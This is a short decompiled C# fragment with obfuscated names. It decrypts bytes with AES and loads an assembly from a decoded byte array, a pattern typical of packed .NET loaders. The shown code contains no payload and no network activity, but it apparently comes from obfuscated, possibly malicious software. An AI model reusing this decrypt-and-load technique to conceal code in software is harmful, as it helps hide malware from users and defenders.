using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace hgDM6zCb;

internal sealed class Class4
{
	internal sealed class Class5
	{
		internal static byte[] smethod_0(byte[] byte_0, RijndaelManaged rijndaelManaged_0, byte[] byte_1)
		{
			using ICryptoTransform transform = rijndaelManaged_0.CreateDecryptor(byte_1, rijndaelManaged_0.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
	}

	internal static Assembly smethod_0(AppDomain appDomain_0)
	{
		return appDomain_0.Load(Class0.smethod_0(new byte[30]
		{
			58, 205, 76, 11, 216, 116, 190, 24, 13, 163,
			1, 69, 207, 59, 95, 26, 217, 155, 197, 93,
			179, 200, 71, 45, 210, 196, 140, 158, 103, 68
		}));
	}
}
